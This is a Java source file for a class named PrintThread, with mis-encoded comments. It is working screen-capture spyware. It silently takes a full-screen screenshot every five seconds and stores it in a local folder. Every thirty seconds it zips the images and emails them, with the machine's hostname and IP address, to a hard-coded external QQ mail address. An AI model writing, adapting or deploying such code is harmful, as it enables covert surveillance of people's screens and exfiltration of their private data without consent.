package org.print;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.text.SimpleDateFormat;
import java.util.Timer;
import java.util.TimerTask;

import javax.imageio.ImageIO;
import javax.mail.MessagingException;

import org.file.FileUtil;
import org.mail.MailUtil;
import org.zip.ZipUtil;

public class PrintThread extends Thread {
	private static SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd-HH-mm-ss");
	private static final String DEFAULT_PATH = "D:/hange_file/hange";
	private static final String DEFAULT_TYPE = "png";
	private static final long DEFAULT_SENDMAIL_TIME = 30000;
	private static final long DEFAULT_GETIMAGE_TIME = 5000;
	
	private String fileName;//�ļ���ǰ׺
	private String filePath;//�ļ��ĸ�Ŀ¼
	private String imageFormat;//ͼ���ļ��ĸ�ʽ
	private long sendMailTime;//�����ʼ����ʱ��
	private long getImageTime;//��ȡ��ͼ���ʱ��
	private Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
	
	public PrintThread() {
		imageFormat = DEFAULT_TYPE;
		filePath = DEFAULT_PATH;
		sendMailTime = DEFAULT_SENDMAIL_TIME;
		getImageTime = DEFAULT_GETIMAGE_TIME;
		File path = new File(filePath);
		if (!path.exists()) {
			path.mkdirs();
		}
	}
	
	public void snapShot() {
		try {
			fileName = filePath + "/" + sdf.format(System.currentTimeMillis());
			// ������Ļ��һ��BufferedImage����screenshot
			BufferedImage screenshot = new Robot().createScreenCapture(
					new Rectangle(0, 0, (int) dimension.getWidth(), (int) dimension.getHeight()));
			// �����ļ�ǰ׺�������ļ���ʽ�������Զ������ļ���
			String name = fileName + "." + imageFormat;
			//   ��screenshot����д��ͼ���ļ�
			ImageIO.write(screenshot, imageFormat, new File(name));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void run() {
		new Timer().schedule(new TimerTask() {
			@Override
			public void run() {
				try {
					sendMail();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}, sendMailTime, sendMailTime);
		while (true) {
			snapShot();
			try {
				Thread.sleep(getImageTime);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	private static void sendMail() throws Exception {
		MailUtil email = new MailUtil();
		email.setTo(new String[]{"476864279@qq.com"});
		InetAddress host = InetAddress.getLocalHost();
		String content = "��������: " + host.getHostName() +" ip:" + host.getHostAddress();
		email.setSubject("������Ϣ");
		email.setContent(content);
		File path = new File(DEFAULT_PATH);
		String []fileList = null;
		String []nameList = null;
		if (path.exists()) {
			nameList = path.list();
		}
		if (nameList != null) {
			String zipname = DEFAULT_PATH + "_" + sdf.format(System.currentTimeMillis()) + ".zip";
			ZipUtil.zip(DEFAULT_PATH, zipname);
			fileList = new String[]{zipname};
			email.setFileList(fileList);
		}
		try {
			email.sendMessage();
			for (String file:nameList) {
				FileUtil.changeDirectory(DEFAULT_PATH + "/" + file, DEFAULT_PATH + "_back", true);
			}
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		} catch (MessagingException e) {
			e.printStackTrace();
		}
	}
} 